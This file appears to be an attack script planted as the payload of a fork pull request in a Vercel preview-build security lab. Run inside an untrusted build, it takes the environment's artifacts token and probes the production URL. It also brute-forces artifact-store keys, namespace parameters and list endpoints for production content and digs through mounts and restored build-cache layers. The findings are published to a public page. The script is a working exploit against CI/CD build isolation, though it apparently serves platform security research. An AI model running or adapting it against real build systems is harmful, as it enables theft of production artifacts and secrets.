#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 12: reading a production artifact
# by name works (PR #8/#9), but nobody has shown a fork-PR build can FIND a name.
# Test discovery: platform-named keys, deployment-id keys, manifest/list endpoints,
# namespace query params. Also settle where the restored build cache came from.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== 0. what this build is =="
  echo "env=${VERCEL_ENV:-unset} deployment=${VERCEL_DEPLOYMENT_ID:-unset}"
  echo "-- does the build reach its own project's production URL? (gives the prod deployment id)"
  PRODBASE="https://vercel-fork-rce-lab-boshjerns-projects.vercel.app"
  PRODLINE=$(curl -s -m 6 "$PRODBASE/prodmarker.txt" 2>&1 | head -1)
  echo "prodmarker.txt -> ${PRODLINE:-<no response>}"
  PROD_DPL=$(echo "$PRODLINE" | sed -n 's/.*build=\([^ ]*\).*/\1/p')
  export PROD_DPL
  echo "learned production deployment id: ${PROD_DPL:-<none>}"
  echo
  echo "== 1. artifact-store discovery: does any un-named key return production content? =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import os, urllib.request as U, urllib.error as E
EP   = os.environ.get("VERCEL_API_ENDPOINT", "https://api.vercel.com")
TEAM = os.environ.get("VERCEL_ARTIFACTS_OWNER", "")
AT   = os.environ.get("VERCEL_ARTIFACTS_TOKEN", "")
BASE = EP + "/v8/artifacts"
NONCE = "PROD-NONCE-7f3a9c2b51d4"
Q = "?teamId=" + TEAM
PROD_DPL = os.environ.get("PROD_DPL", "")
OLD = ["dpl_CfMNZgvpMWP5ndmiZotixKgN3Ub5", "dpl_DNJXwP2T6jyAcPzaX7GZ8d3GNH9j"]
if PROD_DPL:
    OLD.append(PROD_DPL)

def get(url):
    try:
        r = U.urlopen(U.Request(url, headers={"Authorization": "Bearer " + AT}), timeout=6)
        return r.status, r.read()
    except E.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return "ERR", repr(e)[:50].encode()

names = ["lab-shared-read-proof-v1", "lab-prodsecret-v1",
         "44fef76b3198d815", "d53e15d029696e78"]
names += ["%s%s" % (d, s) for d in OLD for s in ("", "/static", "/dist", "/manifest", ".tar.gz")]
names += ["static", "dist", "server", "functions", "output", "build", "public", "manifest",
          "artifacts", "deployment", "prerender-functions", "build-cache", "cache", "toolchain",
          "node_modules", "vercel", "turbo", "turbo-cache", "global-cache", ".vercel",
          "dist.zip", "static.zip", "output.zip", "upload", "files", "source", "checkout",
          "monorepo", "workspace", "probe", "vault", "static-assets", "assets", "bundle",
          "deployment-static", "static-files", "build-output", "cache-static", "dist-static"]
qvariants = ["", "&namespace=production", "&namespace=historical", "&namespace=shared",
             "&namespace=branch", "&scope=production", "&target=production",
             "&deployment=" + (PROD_DPL or "x"), "&deploymentId=" + (PROD_DPL or "x")]
endpoints = [BASE + Q, BASE + "/" + Q, BASE + "/manifest" + Q,
             BASE + "/manifest?deploymentId=" + (PROD_DPL or "x") + "&teamId=" + TEAM,
             BASE + "/universal" + Q, BASE + "/stats" + Q, BASE + "/list" + Q,
             BASE + "/keys" + Q, BASE + "/search?q=lab" + Q,
             BASE + "/historical" + Q, BASE + "/shared" + Q,
             BASE + "/manifest/list" + Q,
             EP + "/v8/deployments" + Q,
             EP + "/v8/deployments/" + (PROD_DPL or "x") + Q,
             EP + "/v10/deployments/" + (PROD_DPL or "x") + Q]

hits = []
other = []
for n in names:
    code, body = get(BASE + "/" + n + Q)
    tag = "NONCE" if NONCE.encode() in body else ""
    if code != 404 or tag:
        snip = body[:90].decode("latin1", "replace").replace("\n", " ") if isinstance(body, bytes) else str(body)
        other.append("  %-34s %-4s %6d %s %s" % (n[:34], str(code), len(body), tag, snip))
        if tag:
            hits.append(n)
for k in ["lab-shared-read-proof-v1", "lab-prodsecret-v1"]:
    for q in qvariants[1:]:
        code, body = get(BASE + "/" + k + Q + q)
        snip = body[:60].decode("latin1", "replace").replace("\n", " ") if isinstance(body, bytes) else str(body)
        other.append("  %-34s %-4s %6d %s" % ((k + q)[:34], str(code), len(body), snip))
for u in endpoints:
    code, body = get(u)
    snip = body[:70].decode("latin1", "replace").replace("\n", " ") if isinstance(body, bytes) else str(body)
    short = u.replace(EP, "").replace("?teamId=" + TEAM, "?")
    other.append("  %-34s %-4s %6d %s" % (short[:34], str(code), len(body), snip))
print("  key/endpoint                          code   bytes  note")
for line in other:
    print(line)
print("  == nonce hits (production content reached without naming it): %d ==" % len(hits))
for h in hits:
    print("     " + h)
PYEOF
  echo
  echo "== 2. provenance of the restored build cache in this cell =="
  echo "-- mounts"
  grep -E 'squashfs|overlay|/vercel' /proc/mounts | sed 's/ /, /g' | cut -c1-200
  echo "-- top of /vercel/path0 (the restored lower layer)"
  ls -la /vercel/path0 2>&1 | head -20
  echo "-- does the restored layer contain the file the PRODUCTION build wrote?"
  echo "   (prodmarker.txt is written only when VERCEL_ENV=production, and never by this build)"
  find /vercel /overlays /volumes -maxdepth 7 -name 'prodmarker*' 2>/dev/null | head -10
  echo "   own copy in this build's output: $(ls -la ../../public/prodmarker.txt 2>&1 | head -1)"
  echo "-- build cache dirs"
  ls -la /vercel/path0/build_cache_child_* 2>&1 | head -8
  du -sh /vercel/squashfs-* 2>&1 | head -3
} > "$F" 2>&1
sleep 2
cat "$F"
